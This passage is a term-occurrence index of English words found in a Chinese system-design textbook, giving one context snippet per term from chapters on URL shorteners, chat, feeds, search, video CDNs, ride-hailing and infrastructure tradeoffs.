  c20_b09.md: ...更短的码就够用了。base-64 会更多，但它包含 `+` 和 `/`，在 URL 中有特殊含义，需要 percent-encoding，使短 URL 外观变复杂。base-62 是实用甜点：高码密度且仅 URL 安全字符。...

=== percent (1 occurrences) ===
  c20_b09.md: ...意味着在码变长前更短的码就够用了。base-64 会更多，但它包含 `+` 和 `/`，在 URL 中有特殊含义，需要 percent-encoding，使短 URL 外观变复杂。base-62 是实用甜点：高码密度且仅 URL 安全字符。...

=== backbone (1 occurrences) ===
  c20_b10.md: ...可以有多个消费者。实时与批量分析有不同一致性要求——哪一个需要强保证？  **答案：** Kafka topic 已是 backbone。增强：向同一个 Kafka topic 添加第二个消费者， feeding 实时分析存储。  **架构：**...

=== easily (1 occurrences) ===
  c20_b12.md: ...理。  真正问题不是尝试次数——即使 1,157 次创建/秒下每代 10 次尝试也只是 11,570 次数据库读/秒， easily 处理。问题是接近容量意味着码空间几乎耗尽。按每天 1 亿（100 million）码，3.5 万亿码可用 95 年。这...

=== noticeable (1 occurrences) ===
  c20_b12.md: ...1 次尝试。生成效率略降但仍可用。 * N = 1.75 万亿码（50% 满）：冲突率 50%，平均每代 2 次尝试。 noticeable 但可管理。  真正问题不是尝试次数——即使 1,157 次创建/秒下每代 10 次尝试也只是 11,570 次数据库读...

=== apns (1 occurrences) ===
  c21_b04.md: ...表查找发现用户 B 没有活跃连接（离线）。消息服务必须：  1. 持久化消息（上面步骤 2 已完成） 2. 可选，通过 APNs（Apple）或 FCM（Google）向 B 的移动设备发送推送通知，提醒有未读消息  当 B 上线并打开应用，客户端...

=== fcm (1 occurrences) ===
  c21_b04.md: ...跃连接（离线）。消息服务必须：  1. 持久化消息（上面步骤 2 已完成） 2. 可选，通过 APNs（Apple）或 FCM（Google）向 B 的移动设备发送推送通知，提醒有未读消息  当 B 上线并打开应用，客户端从 API 拉取消息历史...

=== sort (1 occurrences) ===
  c21_b06.md: ...式设计：Cassandra 的数据模型天然按 partition key（`conversation_id`）分区、按 sort key（`sent_at`）聚簇，提供 O(1) 的分区查找和 O(log N) 的分区内范围扫描。许多大规模聊天系统...

=== resilient (1 occurrences) ===
  c21_b10.md: ...邮件从 HTTP 请求处理器移到异步消费者。首次体验最终一致性：邮件在注册数秒后到达而非同步。用户没注意到；架构显著更 resilient。  **v4（第 11 章）：** 水平扩展加入三台应用服务器。首个分布式 session bug：session 存...

=== ack (1 occurrences) ===
  c21_b13.md: ...et 回发 `{type: "delivery_ack", message_id: M456}`。 10. S3 收到 ack，写数据库：`UPDATE messages SET delivered_at = NOW() WHERE messag...

=== celebrity (1 occurrences) ===
  c22_b03.md: ...### 22.2 名人问题  拥有 1000 万（10 million）关注者的用户在 feed 设计中被称为 **celebrity**（无论是否出名；该术语指架构现象）。名人问题是：如何在写时扇出不会压垮写路径、读时扇出不会压垮读路径的前提下，把帖子...

=== merge (1 occurrences) ===
  c22_b03.md: ...关注的普通用户的写时扇出结果） 2. **按需获取的名人帖子**（读取时从名人最近帖子列表获取）  最终 feed = merge(预计算_timeline, 我关注的 celebrity_posts)  plain 语言：不是对所有人承诺一种策略，...

=== way (1 occurrences) ===
  c22_b03.md: ...能 5 位名人，每位都有缓存的最近帖子列表）。预计算 timeline 已在内存中。合并是按时间戳对有序列表做简单 k-way 合并，再重新排序——约 10ms 计算。  阈值（100 万关注者）是可调参数。设太低会把太多用户划入名人，降低预计算...

=== oversized (1 occurrences) ===
  c22_b06.md: ...dis：`ZADD user:F:timeline <score> <post_id>` 对所有关注者 5. **修剪 oversized timeline：** 扇出后，从超过最大大小（1000 条）的 timeline 中删除低分条目。...

=== delay (1 occurrences) ===
  c23_b02.md: ...以以及速率。      User-agent: *     Disallow: /private/     Crawl-delay: 2  设计良好的爬虫在爬某域名任何页面前先读取 `robots.txt`，并遵守 disallow 指令和 craw...

=== dequeue (1 occurrences) ===
  c23_b02.md: ...rls)          while queue is not empty:         url = queue.dequeue()         page = fetch(url)         links = extract_links(p...

=== doc (1 occurrences) ===
  c23_b04.md: ...radeoff 权衡）  页面被抓取后，必须可被搜索。基本数据结构是倒排索引。让我们理解为什么。  假设有四份文档：  Doc ID | 内容 ---|--- 1 | "distributed systems（分布式系统） are hard" 2...

=== field (1 occurrences) ===
  c23_b04.md: ...位置（词索引）？这支持短语匹配（"distributed systems" 作为精确短语，而非两个分开的词）。 * **Field indicator：** 词在标题、标题栏还是正文中？标题中的词权重更高。  这些增强让 posting list 显...

=== word (1 occurrences) ===
  c23_b04.md: ...B 也要 11 天。  倒排索引反转文档与词之间的关系。不是“文档 → 它包含的词”，而是“词 → 包含它的文档”：  Word | Posting List（Doc IDs） ---|--- distributed | [1, 3] system...

=== indicator (1 occurrences) ===
  c23_b04.md: ...）？这支持短语匹配（"distributed systems" 作为精确短语，而非两个分开的词）。 * **Field indicator：** 词在标题、标题栏还是正文中？标题中的词权重更高。  这些增强让 posting list 显著变大，但也支持更精...

=== position (1 occurrences) ===
  c23_b04.md: ..."distributed systems（分布式系统）" 50 次的文档可能比只提到一次的更相关。 * **Term position：** 词出现在哪些位置（词索引）？这支持短语匹配（"distributed systems" 作为精确短语，而非两个分...

=== requires (1 occurrences) ===
  c23_b04.md: ...| "distributed systems（分布式系统） are hard" 2 | "systems design requires tradeoffs" 3 | "distributed computing and consistency（一致性）"...

=== arguably (1 occurrences) ===
  c23_b05.md: ...排序——TF-IDF 及更远  倒排索引告诉我们哪些文档包含查询词。排序决定其中哪些先显示。这是搜索最难的部分——而且 arguably 是商业价值最大的部分。...

=== ran (1 occurrences) ===
  c23_b05.md: ...ing list 却只有微不足道的排序收益。 5. **词干提取或词形还原：** 把词还原为词根。"Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems（分布式系统...

=== runs (1 occurrences) ===
  c23_b05.md: ...st 却只有微不足道的排序收益。 5. **词干提取或词形还原：** 把词还原为词根。"Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems（分布式系统）" 能匹配包...

=== brin (1 occurrences) ===
  c23_b06.md: ...ystems（分布式系统）" 500 次，单凭 TF-IDF 会得极高分数。  Larry Page 和 Sergey Brin 原创工作的关键洞察：链接即背书。一个网页链接到另一个网页时，链接页的作者隐含地为被链接页的质量担保。许多高质量页面链接...

=== larry (1 occurrences) ===
  c23_b06.md: ...每段都提到 "distributed systems（分布式系统）" 500 次，单凭 TF-IDF 会得极高分数。  Larry Page 和 Sergey Brin 原创工作的关键洞察：链接即背书。一个网页链接到另一个网页时，链接页的作者隐含地为...

=== sergey (1 occurrences) ===
  c23_b06.md: ...buted systems（分布式系统）" 500 次，单凭 TF-IDF 会得极高分数。  Larry Page 和 Sergey Brin 原创工作的关键洞察：链接即背书。一个网页链接到另一个网页时，链接页的作者隐含地为被链接页的质量担保。许多高质...

=== zksnark (1 occurrences) ===
  c23_b06.md: ...verse Document Frequency (IDF)：** 一个词在极少文档中出现，它出现时就是强信号。如果 "zkSNARK" 在 100 亿（10 billion）份文档中只有 1,000 份出现，那么在某份文档中找到它意义很大。如果 "th...

=== distance (1 occurrences) ===
  c23_b07.md: ...ead  用户输入 "dist" 到搜索框，下拉框立即显示 "distributed systems（分布式系统）"、"distance learning"、"distillation"，这是 **typeahead 自动补全**。它是独立于主搜索索引的系...

=== distillation (1 occurrences) ===
  c23_b07.md: ...框，下拉框立即显示 "distributed systems（分布式系统）"、"distance learning"、"distillation"，这是 **typeahead 自动补全**。它是独立于主搜索索引的系统。   #### Typeahead 架构...

=== learning (1 occurrences) ===
  c23_b07.md: ..."dist" 到搜索框，下拉框立即显示 "distributed systems（分布式系统）"、"distance learning"、"distillation"，这是 **typeahead 自动补全**。它是独立于主搜索索引的系统。   ####...

=== consist (1 occurrences) ===
  c23_b08.md: ...istributed Systems Consistency" 变成 ["distribut", "system", "consist"]（词干提取后）。 2. **词项查找：** 对每个词，从倒排索引（可能跨多个分片）检索其 posting list。...

=== distribut (1 occurrences) ===
  c23_b08.md: ...应用索引时相同的分词、归一化和停用词移除。"Distributed Systems Consistency" 变成 ["distribut", "system", "consist"]（词干提取后）。 2. **词项查找：** 对每个词，从倒排索引（可能跨多...

=== heap (1 occurrences) ===
  c23_b08.md: ...数。 4. **Top-K 选择：** 返回 K 个最高得分文档，无需完全排序整个结果列表。可用大小为 K 的 min-heap 高效完成。 5. **结果增强：** 为 top-K 文档获取标题、摘要和 URL，显示在结果页。  步骤 2 和 3...

=== min (1 occurrences) ===
  c23_b08.md: ...相关性分数。 4. **Top-K 选择：** 返回 K 个最高得分文档，无需完全排序整个结果列表。可用大小为 K 的 min-heap 高效完成。 5. **结果增强：** 为 top-K 文档获取标题、摘要和 URL，显示在结果页。  步骤...

=== comparatively (1 occurrences) ===
  c23_b10.md: ...缩 posting list 约 32–64 TB。词表（所有不同词集合及其在 posting list 中的偏移）是 comparatively 小的额外结构。  **Q2.** 一个使用 document-based sharding 的搜索引擎有 100 个分...

=== gather (1 occurrences) ===
  c23_b13.md: ...集体人类判断。  查询流水线跨文档分片扇出，收集并行结果并合并——与第 12 章分布式数据库读取使用的 scatter-gather 模式相同。  展望未来，第 24 章把这些大规模内容分发的想法应用于视频——文档不是文本而是数 GB 的二进制文件，交...

=== scatter (1 occurrences) ===
  c23_b13.md: ...了关于页面质量的集体人类判断。  查询流水线跨文档分片扇出，收集并行结果并合并——与第 12 章分布式数据库读取使用的 scatter-gather 模式相同。  展望未来，第 24 章把这些大规模内容分发的想法应用于视频——文档不是文本而是数 GB 的...

=== network (1 occurrences) ===
  c24_b04.md: ...5%——不算灾难，但 2 小时电影中播放器要请求数百片段时会累积。  解决方案是 **Content Delivery Network（CDN）**：一个全球分布的服务器网络，把视频内容缓存到离观众近的地方。   #### 定义：CDN 架构  **CD...

=== manifest (1 occurrences) ===
  c24_b06.md: ...动）：**  * 观众点击播放时：API 服务器查询视频元数据服务（标题、可用质量级别、DRM 如适用）→ 播放器获得 manifest URL → 播放器从 CDN 边缘请求清单 → ABR 流开始  控制路径的 API 服务器是无状态的（第 11 章无...

=== seeking (1 occurrences) ===
  c24_b08.md: ...检测  **Q1.** 为什么视频要切成 2–10 秒片段而非存为单个大文件？  **答案：** 三个原因：(1) **Seeking：** 观众跳到 2 小时电影的 90 分钟处时，可从最近的片段边界下载，而无需下载并丢弃 90 分钟视频数据。(2)...

=== movie (1 occurrences) ===
  c24_b12.md: ...基础设施每次请求新鲜生成。搜索结果页缓存命中率接近 0%；静态资源接近 100%。对视频，内容本身完美共享——每位请求“Movie X 第 47 个 1080p 片段”的观众收到相同字节。热门视频 CDN 命中率极高（90%+）。CDN 设计反映这点...

=== completed (1 occurrences) ===
  c25_b01.md: ...* 行程状态机：REQUESTED → ACCEPTED → DRIVER_ARRIVING → IN_TRIP → COMPLETED → BILLED * 当某区域需求超过供给时自动激活动态加价（surge pricing） * 金融交易事务（tran...

=== requested (1 occurrences) ===
  c25_b01.md: ...近可用司机，持续更新 * 活跃司机每 4 秒发送一次位置更新 * 向乘客和司机显示 ETA 并持续更新 * 行程状态机：REQUESTED → ACCEPTED → DRIVER_ARRIVING → IN_TRIP → COMPLETED → BILLED...

=== trip (1 occurrences) ===
  c25_b06.md: ...RE trip_id = X FOR UPDATE;            -- 验证该行程尚未计费       IF trip.status = 'COMPLETED_UNBILLED' THEN         -- 计算最终车费...

=== pid (1 occurrences) ===
  c25_b05.md: ...倍数）与误差（供需缺口）成正比。更复杂的实现加入积分和微分项——价格变化更平滑，系统能预测趋势——即 ride 定价的 PID 控制器。  * * *...

=== atomicity (1 occurrences) ===
  c25_b06.md: ...transaction）。  要求严格：  * **Exactly once：** 每张信用卡每笔行程只扣一次 * **Atomicity：** 对乘客扣款与给司机账户入账必须同时发生或都不发生 * **Durability：** 事务一旦提交，就经受住后续...

=== correctness (1 occurrences) ===
  c25_b06.md: ...司机账户入账必须同时发生或都不发生 * **Durability：** 事务一旦提交，就经受住后续任何系统故障 * **Correctness：** 计费金额必须严格等于行程价格（距离 × 费率 + 动态加价倍数 × 起步价）  这是关系型数据库上 ACID（而...

=== then (1 occurrences) ===
  c25_b06.md: ...-- 验证该行程尚未计费       IF trip.status = 'COMPLETED_UNBILLED' THEN         -- 计算最终车费         INSERT INTO billing_ledger (trip_...

=== alone (1 occurrences) ===
  c25_b10.md: ...个 Redis 节点内存。吞吐是约束：125,000 写入/秒。单个 Redis 节点 500,000 操作/秒对写入 alone 有充足余量，但还要处理读取（乘客查询附近司机）和 geohash 索引更新（每次位置变化 2 次集合操作 = 3 次总...

=== entire (1 occurrences) ===
  c25_b12.md: ...5 million）次写入——这个数字立即排除了关系型数据库作为位置存储，并强制使用带分片的内存键值存储。这个数字消除 entire 技术类别。30 秒匹配窗口产生二级约束：匹配算法必须在窗口内完成多个司机邀请周期，意味着每个邀请必须在 10–15 秒...

=== range (1 occurrences) ===
  c26_b11.md: ...护的 Merkle tree 叶子覆盖 1 万（10,000）键范围。某节点故障后从 1 小时中断恢复，估计该 key range 期间有约 50 万（500,000）键被写入。估算定位分歧范围所需 Merkle tree 比较次数、分歧叶子节点数、...

=== celery (1 occurrences) ===
  c27_b02.md: ...用户报告的延迟在上升。   #### v3 —— 第 8 章：用消息队列解耦（第 6–9 个月）  **它是什么：** Celery（Python 任务队列），后端先由 Redis 支持，可靠性要求提高后换成 RabbitMQ。通知发送、邮件投递、fe...

=== subtle (1 occurrences) ===
  c27_b02.md: ...丢失）。  **技术债务：** Worker 任务失败开始静默。团队没有对队列深度或任务失败率做充分监控。两周内，一个 subtle bug 导致 15% 欢迎邮件静默失败——团队直到有用户发邮件给客服问为什么没收到欢迎邮件才发现。  **监控教训：*...

=== elk (1 occurrences) ===
  c27_b04.md: ...）  **它是什么：** 完整的现代 SocialSnap 架构：Kubernetes 编排、Jaeger 分布式追踪、ELK 集中日志、Kafka 事件骨干、CDN 媒体交付、完整微服务网格。  **关键决策：**  * Kafka 取代 Ra...

=== jaeger (1 occurrences) ===
  c27_b04.md: ...架构（第 36–48 个月）  **它是什么：** 完整的现代 SocialSnap 架构：Kubernetes 编排、Jaeger 分布式追踪、ELK 集中日志、Kafka 事件骨干、CDN 媒体交付、完整微服务网格。  **关键决策：**  * K...

=== cost (1 occurrences) ===
  c27_b04.md: ...（technical debt）** 是今天选择更简单、实现更快的方案而非更稳健但实现更慢的方案所隐含的 future cost。它是债务，因为像金融债务一样会累积利息：拖欠越久，越难偿还。  plain 语言：技术债务是“我们实际构建的”与“如果...

=== captures (1 occurrences) ===
  c27_b07.md: ...个人知道一切。80 名工程师时，没有一个人理解整个系统。  这一变化有深远的架构后果。康威定律（第 28 章深入探讨） captures it：软件系统的结构倾向于反映构建它的组织的沟通结构。  8 名工程师作为一个团队工作：单体合理。每个人都向同一代码库...

=== hop (1 occurrences) ===
  c27_b10.md: ...不同可靠性目标；不同 on-call 轮值。成本：auth 调用 profile 或 vice versa 时新增网络 hop；分布式追踪现在覆盖两个服务；任一服务故障都需要仔细降级设计（Auth 宕机时 User Service 显示什么？）；...

=== versa (1 occurrences) ===
  c27_b10.md: ...uth；可为每个服务设置不同可靠性目标；不同 on-call 轮值。成本：auth 调用 profile 或 vice versa 时新增网络 hop；分布式追踪现在覆盖两个服务；任一服务故障都需要仔细降级设计（Auth 宕机时 User Servi...

=== vice (1 occurrences) ===
  c27_b10.md: ...下迭代 auth；可为每个服务设置不同可靠性目标；不同 on-call 轮值。成本：auth 调用 profile 或 vice versa 时新增网络 hop；分布式追踪现在覆盖两个服务；任一服务故障都需要仔细降级设计（Auth 宕机时 User...

=== devops (1 occurrences) ===
  c27_b12.md: ...产品上花几个月而不是在基础设施上。其次，即使创始人正确预测了规模架构，他们也无法运维它。Kubernetes 集群需要 DevOps 专长；Kafka 部署需要分布式日志运营知识。2 人创始团队没有这种专长，在公司有收入前招聘这些人员也贵得不可能。第三...

=== earned (1 occurrences) ===
  c27_b12.md: ...is 缓存是因为 profile 读取慢才加的；消息队列是因为邮件投递阻塞 API 响应才加的。每个组件都是先有问题再 earned。这不是“一开始就把它建好”的次优方法——它本身就是正确方法。系统是通过为具体观察到的问题累积具体解决方案而构建的，而不...

=== tripwire (1 occurrences) ===
  c27_b13.md: ...分片键），在 权衡矩阵（Tradeoff Matrix） 中明确记录，标记为“若以后改变分片数量则是架构债务”，并设置 tripwire——当系统达到 X 用户或 Y QPS 时重新审视该决策。这把“未知的未知”变成“已知的 future work”，从而...

=== upfront (1 occurrences) ===
  c27_b13.md: ...—以后可以低成本改变。对不可逆（或逆转成本极高）决策（数据库分片键、一致性模型、事件 schema 设计、服务边界）， upfront 多花成比例时间。分片键不可逆-昂贵：SocialSnap 花 3 个月从模运算迁移到一致性哈希。如果一开始就用一致性哈...

=== work (1 occurrences) ===
  c27_b13.md: ...tripwire——当系统达到 X 用户或 Y QPS 时重新审视该决策。这把“未知的未知”变成“已知的 future work”，从而可管理。   ### 本章总结  本章后退一步，从具体系统抽离，审视 SocialSnap——以及扩展地说，真实...

=== melvin (1 occurrences) ===
  c28_b01.md: ...alSnap 工程师，将获得最后的发言权。  * * *   ### 28.1 康威定律——组织的镜子  1967 年，Melvin Conway 观察到设计系统的组织会受约束，只能产出反映其沟通结构的设计。他当时写的是软件编译器，但这一观察普遍适用。...

=== structuring (1 occurrences) ===
  c28_b02.md: ...如果康威定律是描述，那么 **Inverse Conway Maneuver** 就是处方：有意按照你想要的架构来 structuring 你的组织。  如果你想要一个具有清晰服务边界的微服务架构，就先把团队围绕这些服务边界组织起来——在写代码之前。每个团队...

=== rotation (1 occurrences) ===
  c28_b03.md: ...#### On-Call 工程  每个超过一定规模的生产系统都需要有人员在出问题时可联系。**On-call rotation** 是一种组织实践，指定哪些工程师在特定时间段内负责响应生产事件。  有效的 on-call 系统包括：  **分级升...

=== functions (1 occurrences) ===
  c28_b04.md: ...不为空闲服务器时间付费。  plain 语言：你写一个函数，上传到 AWS Lambda 或 Google Cloud Functions。请求来时，云 provider 在需要的基础设施上运行你的函数，自动扩展以处理更多请求，并按毫秒执行时间收费。你从未配...

=== webassembly (1 occurrences) ===
  c28_b06.md: ...N 边缘节点运行应用逻辑——正是提供缓存内容的服务器。来自东京的请求可以由在东京边缘服务器运行的 JavaScript/WebAssembly 代码处理，延迟低于 1 毫秒（sub-millisecond）。  这之所以可能，是因为现代 CDN provider...

=== vpc (1 occurrences) ===
  c28_b08.md: ...基础设施——200 台应用服务器、40 个数据库实例、15 个 Redis 集群、8 个 Kafka 集群、负载均衡器、VPC、DNS 配置——用约 1.5 万行（15,000）Terraform 配置文件描述。任何工程师运行 `terrafor...

=== engine (1 occurrences) ===
  c28_b08.md: ...resource "aws_db_instance" "socialsnap_postgres" {       engine         = "postgres"       engine_version = "14.0"       in...

=== resource (1 occurrences) ===
  c28_b08.md: ...（来自 HashiCorp）是最广泛使用的 IaC 工具。Terraform 文件描述基础设施的期望状态：       resource "aws_db_instance" "socialsnap_postgres" {       engine...

=== xlarge (1 occurrences) ===
  c28_b08.md: ...engine_version = "14.0"       instance_class = "db.r5.xlarge"       allocated_storage = 500       multi_az      = true...

=== causal (1 occurrences) ===
  c28_b10.md: ...E) | 更低——读写无需协调 | 最终——读可能返回陈旧数据 | 更高——分区不阻塞操作 | 中——需要冲突解决 **Causal consistency** (Ch 4) | 中——因果元数据开销 | 因果——保证“看到自己的写” | 高 | 高—...

=== eventual (1 occurrences) ===
  c28_b10.md: ...(Ch 4 ACID) | 更高——需要写协调 | 强——所有读者看到最新写 | 较低——分区导致不可用 | 中 **Eventual consistency** (Ch 4 BASE) | 更低——读写无需协调 | 最终——读可能返回陈旧数据 | 更高...

=== replication (1 occurrences) ===
  c28_b10.md: ...赖快则低；依赖慢则高 | 强——调用方始终看到最新状态 | 较低——被调用方失败则调用方失败 | 初始低，故障时高 **Replication** (Ch 2) | 有副本时读延迟更低 | 最终（异步副本）；强（同步） | 更高——主库故障读仍存活 | 中——需...

=== strong (1 occurrences) ===
  c28_b10.md: ...有副本时读延迟更低 | 最终（异步副本）；强（同步） | 更高——主库故障读仍存活 | 中——需监控复制 lag **Strong consistency** (Ch 4 ACID) | 更高——需要写协调 | 强——所有读者看到最新写 | 较低——...

=== synchronous (1 occurrences) ===
  c28_b10.md: ...幅降低读延迟（缓存命中） | 最终一致——缓存数据可能陈旧 | 更高（DB 慢时读仍成功） | 中——缓存失效很难 **Synchronous calls** (Ch 2) | 依赖快则低；依赖慢则高 | 强——调用方始终看到最新状态 | 较低——被调用方失败则...

=== calls (1 occurrences) ===
  c28_b10.md: ...| 最终一致——缓存数据可能陈旧 | 更高（DB 慢时读仍成功） | 中——缓存失效很难 **Synchronous calls** (Ch 2) | 依赖快则低；依赖慢则高 | 强——调用方始终看到最新状态 | 较低——被调用方失败则调用方失败...

=== block (1 occurrences) ===
  c28_b11.md: ...**Rate limiting** (Ch 9) | 被限流请求增加延迟 | N/A | 保护服务可用性 | 中 **Block storage (SSD/HDD)** (Ch 10) | SSD 低，HDD 中 | 持久 | 中 | 低 **Ob...

=== cold (1 occurrences) ===
  c28_b11.md: ...h 10) | 中（网络往返） | 最终（可选强一致） | 极高（11 个 9（11 nines）持久性） | 低 **Cold/archival storage** (Ch 10) | 高（检索需分钟） | 持久 | 高 | 低（成本优化）...

=== relational (1 occurrences) ===
  c28_b11.md: ...ility Impact | Operational Complexity ---|---|---|---|--- **Relational DB (PostgreSQL)** (Ch 5) | 中——ACID 写开销 | 强（ACID） | 中——单主是瓶颈...

=== round (1 occurrences) ===
  c28_b11.md: ...盘写） | 分区内有序；跨消费者最终 | 极高——复制、持久化 | 高——Zookeeper/KRaft、分区管理 **Round-robin load balancing** (Ch 9) | 无延迟开销 | N/A | 高 | 低 **Least...

=== archival (1 occurrences) ===
  c28_b11.md: ...| 中（网络往返） | 最终（可选强一致） | 极高（11 个 9（11 nines）持久性） | 低 **Cold/archival storage** (Ch 10) | 高（检索需分钟） | 持久 | 高 | 低（成本优化）    （术语译法：一致...

=== connections (1 occurrences) ===
  c28_b11.md: ...robin load balancing** (Ch 9) | 无延迟开销 | N/A | 高 | 低 **Least-connections load balancing** (Ch 9) | 避免慢后端而更低 | N/A | 高 | 低 **Consiste...

=== family (1 occurrences) ===
  c28_b11.md: ...s)** (Ch 6, 7) | 极低（内存） | 最终（异步复制） | 高（集群模式） | 低–中 **Column-family store (Cassandra)** (Ch 6) | 低（写优化） | 可调（N/W/R quorum） | 极高...

=== indexes (1 occurrences) ===
  c28_b11.md: ...L)** (Ch 5) | 中——ACID 写开销 | 强（ACID） | 中——单主是瓶颈 | 中 **B-tree indexes** (Ch 5) | 降低读延迟；提高写延迟 | N/A | N/A | 低——自动维护 **Document sto...

=== limiting (1 occurrences) ===
  c28_b11.md: ...低（二进制、多路复用 HTTP/2） | 无状态 | 高 | 中——protobuf schema 管理 **Rate limiting** (Ch 9) | 被限流请求增加延迟 | N/A | 保护服务可用性 | 中 **Block storage (S...

=== messaging (1 occurrences) ===
  c28_b11.md: ...| 生产者延迟更高（异步投递） | 至少一次或精确一次（可配置） | 高——队列缓冲故障 | 中 **Pub-sub messaging** (Ch 8) | 更高（异步） | 最终（消费者按自己节奏处理） | 极高——故障域解耦 | 中–高 **Kafk...

=== robin (1 occurrences) ===
  c28_b11.md: ...分区内有序；跨消费者最终 | 极高——复制、持久化 | 高——Zookeeper/KRaft、分区管理 **Round-robin load balancing** (Ch 9) | 无延迟开销 | N/A | 高 | 低 **Least-conne...

=== horizontal (1 occurrences) ===
  c28_b12.md: ...ility Impact | Operational Complexity ---|---|---|---|--- **Horizontal scaling** (Ch 11) | 无延迟成本；支持更多并行 | 要求无状态设计 | 高——故障只影响 1/N 流...

=== istio (1 occurrences) ===
  c28_b12.md: ...e mesh** (Ch 13) | 轻微开销（sidecar 代理） | N/A | 极高（熔断、重试） | 极高——Istio/Linkerd 运营负担 **API gateway** (Ch 13, 9) | 小开销 | N/A | 中——未集...

=== linkerd (1 occurrences) ===
  c28_b12.md: ...** (Ch 13) | 轻微开销（sidecar 代理） | N/A | 极高（熔断、重试） | 极高——Istio/Linkerd 运营负担 **API gateway** (Ch 13, 9) | 小开销 | N/A | 中——未集群则 SPOF...

=== microservices (1 occurrences) ===
  c28_b12.md: ...(DB)** (Ch 12, 26) | 无延迟成本；最小迁移 | N/A | 高——拓扑变更时最小扰动 | 中 **Microservices** (Ch 13) | 服务间调用更高；整体更低（独立扩展） | 服务内强；服务间最终 | 高——部分失败而非整体 |...

=== stateless (1 occurrences) ===
  c28_b12.md: ...11) | 无延迟成本；支持更多并行 | 要求无状态设计 | 高——故障只影响 1/N 流量 | 中——需要编排 **Stateless services** (Ch 11) | 无延迟成本 | N/A（状态外置） | 极高——任意服务器处理任意请求 |...

=== vertical (1 occurrences) ===
  c28_b12.md: ...11) | 无延迟成本 | N/A（状态外置） | 极高——任意服务器处理任意请求 | 单服务器低；外部状态存储中 **Vertical scaling** (Ch 11) | 更低延迟（更快硬件） | N/A | 低——单机器 SPOF | 低 **Re...

=== breaker (1 occurrences) ===
  c28_b12.md: ...rn** (Ch 14) | 中（顺序补偿） | 最终（补偿事务） | 高 | 高——补偿事务设计 **Circuit breaker** (Ch 16) | 闭合时无开销；打开时快速失败 | N/A | 极高——隔离故障 | 中    （术语译法：一致...

=== replicas (1 occurrences) ===
  c28_b12.md: ...aling** (Ch 11) | 更低延迟（更快硬件） | N/A | 低——单机器 SPOF | 低 **Read replicas** (Ch 12) | 读延迟更低 | 最终（复制 lag） | 读可用性更高 | 中——故障转移配置 **Datab...

=== services (1 occurrences) ===
  c28_b12.md: ...成本；支持更多并行 | 要求无状态设计 | 高——故障只影响 1/N 流量 | 中——需要编排 **Stateless services** (Ch 11) | 无延迟成本 | N/A（状态外置） | 极高——任意服务器处理任意请求 | 单服务器低；外部状...

=== sourcing (1 occurrences) ===
  c28_b12.md: ...14) | 读延迟更低（优化读模型） | 最终（读模型可能落后写模型） | 高 | 高——维护两个模型 **Event sourcing** (Ch 8, 14) | 事件回放查询更高 | 强（事件日志是真相来源） | 极高（日志只追加、持久） | 极高—...

=== bulkhead (1 occurrences) ===
  c28_b13.md: ...*Health checks** (Ch 16) | 无延迟开销 | N/A | 高——负载均衡器绕开故障 | 低 **Bulkhead pattern** (Ch 16) | 无延迟开销 | N/A | 极高——失败限制在一个池 | 中 **Retry...

=== graceful (1 occurrences) ===
  c28_b13.md: ...ility Impact | Operational Complexity ---|---|---|---|--- **Graceful degradation** (Ch 16) | 无延迟开销 | 部分——某些功能返回陈旧/空 | 极高——核心功能存活...

=== health (1 occurrences) ===
  c28_b13.md: ...(Ch 16) | 无延迟开销 | 部分——某些功能返回陈旧/空 | 极高——核心功能存活 | 中——需要降级逻辑 **Health checks** (Ch 16) | 无延迟开销 | N/A | 高——负载均衡器绕开故障 | 低 **Bulkhea...

=== retry (1 occurrences) ===
  c28_b13.md: ...lkhead pattern** (Ch 16) | 无延迟开销 | N/A | 极高——失败限制在一个池 | 中 **Retry with backoff** (Ch 16) | 失败时更高（重试延迟） | 可能造成重复操作（非幂等） | 更高——...

=== backoff (1 occurrences) ===
  c28_b13.md: ...ern** (Ch 16) | 无延迟开销 | N/A | 极高——失败限制在一个池 | 中 **Retry with backoff** (Ch 16) | 失败时更高（重试延迟） | 可能造成重复操作（非幂等） | 更高——从瞬时故障恢复 | 低——...

=== degradation (1 occurrences) ===
  c28_b13.md: ...act | Operational Complexity ---|---|---|---|--- **Graceful degradation** (Ch 16) | 无延迟开销 | 部分——某些功能返回陈旧/空 | 极高——核心功能存活 | 中——需要降级逻辑...

=== keys (1 occurrences) ===
  c28_b13.md: ...迟） | 可能造成重复操作（非幂等） | 更高——从瞬时故障恢复 | 低——必须处理幂等性 **Idempotency keys** (Ch 16, 25) | 微小开销（键检查） | 强——精确一次语义 | N/A | 低 **Distribut...

=== tracing (1 occurrences) ===
  c28_b13.md: ...(Ch 16, 25) | 微小开销（键检查） | 强——精确一次语义 | N/A | 低 **Distributed tracing** (Ch 17) | 微小开销（trace 上下文传播） | N/A | N/A | 高——所有服务插桩 **Can...

=== adaptive (1 occurrences) ===
  c28_b14.md: ...离线批量；非实时） | 最终（上传到可用有延迟） | 高（队列缓冲故障） | 高——编解码配置、并行 worker **Adaptive bitrate streaming (ABR)** (Ch 24) | 极低（客户端算法） | N/A | 极高（优雅...

=== hybrid (1 occurrences) ===
  c28_b14.md: ...on read** (Ch 22) | 读高（读时计算） | 强（读时始终最新） | 中（读需要多次取） | 低 **Hybrid fan-out** (Ch 22) | 低（预计算 + 按需结合） | 普通用户最终；名人近实时 | 高 | 高——阈...

=== inverted (1 occurrences) ===
  c28_b14.md: ...ucket)** (Ch 20) | 微小开销 | 强——不能过度放行 | 高 | 中——分布式状态维护每用户计数 **Inverted index (search)** (Ch 23) | 查询延迟极低（预计算） | 最终（新文档出现前有索引延迟） |...

=== bitrate (1 occurrences) ===
  c28_b14.md: ...| 最终（上传到可用有延迟） | 高（队列缓冲故障） | 高——编解码配置、并行 worker **Adaptive bitrate streaming (ABR)** (Ch 24) | 极低（客户端算法） | N/A | 极高（优雅降级） | 中（...

=== crawler (1 occurrences) ===
  c28_b14.md: ...(Ch 23) | 无查询延迟开销（批量计算） | 最终（定期重算） | N/A | 高——分布式图计算 **Web crawler / URL frontier** (Ch 23) | N/A | 最终（网络持续被抓取） | 高（分布式爬虫） | 高...

=== limiter (1 occurrences) ===
  c28_b14.md: ...低（键查找 + 重定向） | 最终（短 URL → 长 URL 映射） | 极高（读多、可缓存） | 低 **Rate limiter (token bucket)** (Ch 20) | 微小开销 | 强——不能过度放行 | 高 | 中——分布式状态维...

=== nodes (1 occurrences) ===
